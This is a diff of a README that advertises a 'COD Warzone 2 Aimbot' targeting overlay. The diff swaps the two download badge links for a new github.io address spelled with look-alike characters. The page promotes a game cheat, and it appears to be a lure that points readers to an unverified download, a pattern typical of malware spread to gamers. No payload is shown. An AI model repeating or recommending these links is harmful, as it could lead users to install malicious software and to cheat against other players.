@@ -1,7 +1,7 @@
 # 🎯 COD Warzone 2 Aimbot — Visual Targeting Overlay Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://warzonecod1soft1web0.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=call-of-duty)](https://warzonecod1soft1web0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://codwarzone1aimass1st-s0ft.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=call-of-duty)](https://codwarzone1aimass1st-s0ft.github.io/.github/)
 
 ---
 
